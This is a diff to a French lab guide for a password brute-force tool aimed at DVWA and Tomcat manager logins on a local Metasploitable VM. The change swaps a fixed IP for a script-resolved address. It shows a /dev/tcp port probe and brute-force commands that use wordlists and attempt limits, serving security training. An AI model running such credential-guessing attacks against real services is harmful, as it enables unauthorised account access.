@@ -931,13 +931,16 @@ de champs, codes HTTP, messages, port de Tomcat — est calqué sur le réel.
 
 #### 8.8.2 Sur la vraie VM
 
-Toujours commencer par **vérifier le port**, parce qu'il ne correspond pas
-toujours à celui qu'on attend :
+Toujours commencer par **résoudre l'adresse**, puis **vérifier le port**, parce
+qu'il ne correspond pas toujours à celui qu'on attend :
 
 ```bash
+# l'IP est attribuée par DHCP : jamais d'adresse en dur
+VM=$(./adresse_vm.sh) || exit 1
+
 # ports fermés : ce n'est pas une erreur, c'est une information
 for p in 80 8080 8180; do
-    timeout 2 bash -c "echo > /dev/tcp/192.168.56.4/$p" 2>/dev/null \
+    timeout 2 bash -c "echo > /dev/tcp/$VM/$p" 2>/dev/null \
         && echo "$p ouvert" || echo "$p fermé"
 done
 ```
@@ -951,19 +954,19 @@ répond plus du tout, ce qui fait croire à tort que les applications web ont
 disparu.
 
 ```bash
-# 1. Connaître l'adresse de la VM (Vagrant, ou la valeur notée à l'installation)
-ping -c1 192.168.56.4
+# 1. L'adresse vient du script, qui interroge VirtualBox pour la MAC
+VM=$(./adresse_vm.sh) || exit 1
 
 # 2. Analyser le formulaire : aucune requête d'authentification n'est envoyée
-python3 bruteforce.py --inspect -u http://192.168.56.4/dvwa/login.php
+python3 bruteforce.py --inspect -u http://$VM/dvwa/login.php
 
 # 3. Voir la requête qui partirait, toujours sans l'envoyer
 python3 bruteforce.py --profil dvwa -U admin \
-    -u http://192.168.56.4/dvwa/login.php --dry-run
+    -u http://$VM/dvwa/login.php --dry-run
 
 # 4. L'attaque, limitée à vingt essais
 python3 bruteforce.py --profil dvwa -U admin -k 20 -d 0.5 \
-    -u http://192.168.56.4/dvwa/login.php -w dico_metasploitable.txt
+    -u http://$VM/dvwa/login.php -w dico_metasploitable.txt
 ```
 
 L'étape 2 est celle qui évite les mauvaises surprises : `--inspect` affiche les
@@ -1006,7 +1009,7 @@ par fréquence) et `-k` pour borner la durée :
 
 ```bash
 python3 bruteforce.py --profil dvwa -U admin -w dico.txt -k 200 -d 0.3 \
-    -u http://192.168.56.4/dvwa/login.php
+    -u http://$VM/dvwa/login.php
 ```
 
 `Lab2024!` n'est volontairement présent dans aucun de ces dictionnaires : c'est
@@ -1052,7 +1055,7 @@ L'outil gère ce cas avec `--basic-auth` (directement inclus dans
 
 ```bash
 python3 bruteforce.py --profil tomcat \
-    -u http://192.168.56.4:8180/manager/html -U tomcat \
+    -u http://$VM:8180/manager/html -U tomcat \
     -w dico_metasploitable.txt -m GET -k 10
 ```
 
